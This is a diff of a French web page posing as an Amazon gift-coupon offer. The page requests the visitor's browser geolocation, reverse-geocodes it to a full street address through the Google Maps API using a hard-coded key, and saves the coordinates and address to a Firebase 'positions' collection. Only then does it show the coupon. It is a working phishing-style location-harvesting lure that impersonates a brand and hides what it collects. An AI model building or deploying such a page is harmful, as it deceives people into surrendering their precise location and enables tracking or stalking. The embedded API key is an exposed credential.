@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <title>Offre Amazon</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Style moderne -->
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -64,7 +63,6 @@
     <div id="couponCode">Votre code : <span>AMAZONGIFT2025</span></div>
   </div>
 
-  <!-- Firebase SDK + Script principal -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
     import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
@@ -81,7 +79,7 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // 👇 Rendre accessible depuis le bouton HTML
+    // 👇 Fonction disponible globalement
     window.getLocation = async function () {
       if (!navigator.geolocation) {
         alert("La géolocalisation n'est pas supportée par ce navigateur.");
@@ -93,32 +91,42 @@
         const lon = position.coords.longitude;
 
         try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+          const apiKey = "AIzaSyB1R0w3WugDO2zDF4WDPJnGlyDc4xZ0VYQ";
+          const res = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${apiKey}`);
           const data = await res.json();
-          const address = data.address;
 
-          const docData = {
-            date: new Date().toISOString(),
-            latitude: lat,
-            longitude: lon,
-            rue: address.road || "",
-            ville: address.city || address.town || address.village || "",
-            codePostal: address.postcode || "",
-            pays: address.country || "",
-            fullAdresse: data.display_name || ""
-          };
+          if (data.status === "OK" && data.results.length > 0) {
+            const result = data.results[0];
+            const fullAdresse = result.formatted_address;
+            const components = result.address_components;
+            const getComp = (type) => components.find(c => c.types.includes(type))?.long_name || "";
 
-          await addDoc(collection(db, "positions"), docData);
+            const docData = {
+              date: new Date().toISOString(),
+              latitude: lat,
+              longitude: lon,
+              rue: getComp("route") + " " + getComp("street_number"),
+              ville: getComp("locality"),
+              codePostal: getComp("postal_code"),
+              pays: getComp("country"),
+              fullAdresse: fullAdresse
+            };
 
-          document.getElementById("couponCode").style.display = "block";
+            await addDoc(collection(db, "positions"), docData);
+            document.getElementById("couponCode").style.display = "block";
+          } else {
+            alert("Impossible de récupérer l’adresse exacte.");
+            console.error("Erreur Google API :", data);
+          }
+
         } catch (error) {
-          alert("Erreur : impossible d'obtenir votre position exacte.");
-          console.error("Erreur reverse geocoding ou Firebase :", error);
+          alert("Erreur réseau ou API.");
+          console.error("Erreur :", error);
         }
       }, (error) => {
         alert("Erreur de géolocalisation : " + error.message);
       });
-    }
+    };
   </script>
 </body>
 </html>
